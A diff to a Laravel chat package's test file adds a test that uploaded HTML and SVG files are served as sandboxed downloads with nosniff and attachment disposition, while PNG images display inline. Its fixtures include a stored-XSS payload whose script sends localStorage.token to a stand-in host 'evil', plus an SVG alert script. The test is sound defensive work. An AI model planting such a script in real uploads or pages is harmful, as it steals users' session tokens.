@@ -113,12 +113,66 @@ class MessagesTest extends TestCase
 
             $url = $response->json('data.attachments.1.url');
             $this->assertStringContainsString('/api/chat/attachments/', $url);
-            $this->get($url)->assertOk()->assertHeader('Content-Type', 'application/pdf');
+            // A PDF downloads (only plain images, video and audio show in the browser)
+            $this->get($url)->assertOk()->assertHeader('Content-Type', 'application/octet-stream');
+            $this->get($response->json('data.attachments.0.url'))->assertOk()->assertHeader('Content-Type', 'image/png');
             $this->get(strtok($url, '?'))->assertForbidden(); // without the signature
 
             // Deleting the message takes the file offline
             Chat::delete($this->conversation->messages()->first());
             $this->get($url)->assertNotFound();
+        } finally {
+            (new Filesystem)->deleteDirectory($root);
+        }
+    }
+
+    public function test_files_that_could_run_script_download_instead_of_opening(): void
+    {
+        $root = sys_get_temp_dir().'/laravel-chat-tests-'.uniqid();
+        config([
+            'filesystems.disks.chat' => ['driver' => 'local', 'root' => $root, 'serve' => false],
+            'laravel-chat.attachments.disk' => 'chat',
+        ]);
+
+        try {
+            $response = $this->actingAs($this->ann)
+                ->post($this->messagesUrl(), [
+                    'attachments' => [
+                        UploadedFile::fake()->createWithContent('report.html', '<script>fetch("//evil/?t="+localStorage.token)</script>'),
+                        UploadedFile::fake()->createWithContent('logo.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
+                        UploadedFile::fake()->image('photo.png', 20, 20),
+                    ],
+                ], ['Accept' => 'application/json'])
+                ->assertCreated()
+                // An SVG is a file, not an image: no <img>, no viewer, no "open in a new tab"
+                ->assertJsonPath('data.attachments.0.isImage', false)
+                ->assertJsonPath('data.attachments.1.isImage', false)
+                ->assertJsonPath('data.attachments.1.type', 'image/svg+xml')
+                ->assertJsonPath('data.attachments.2.isImage', true);
+
+            foreach ([0 => 'report.html', 1 => 'logo.svg'] as $index => $name) {
+                $served = $this->get($response->json("data.attachments.$index.url"))->assertOk()
+                    ->assertHeader('Content-Type', 'application/octet-stream')
+                    ->assertHeader('X-Content-Type-Options', 'nosniff');
+                $this->assertStringStartsWith('attachment;', $served->headers->get('Content-Disposition'));
+                $this->assertStringContainsString($name, $served->headers->get('Content-Disposition'));
+                $this->assertStringContainsString('sandbox', $served->headers->get('Content-Security-Policy'));
+            }
+
+            $photo = $this->get($response->json('data.attachments.2.url'))->assertOk()
+                ->assertHeader('Content-Type', 'image/png')
+                ->assertHeader('X-Content-Type-Options', 'nosniff');
+            $this->assertStringStartsWith('inline;', $photo->headers->get('Content-Disposition'));
+
+            // Nor is it media in the Files tab
+            $this->assertSame(
+                ['photo.png'],
+                array_column($this->actingAs($this->ann)->getJson('/api/chat/conversations/'.$this->conversation->id.'/files?type=media')->json('data'), 'name'),
+            );
+            $this->assertSame(
+                ['logo.svg', 'report.html'],
+                array_column($this->actingAs($this->ann)->getJson('/api/chat/conversations/'.$this->conversation->id.'/files?type=files')->json('data'), 'name'),
+            );
         } finally {
             (new Filesystem)->deleteDirectory($root);
         }
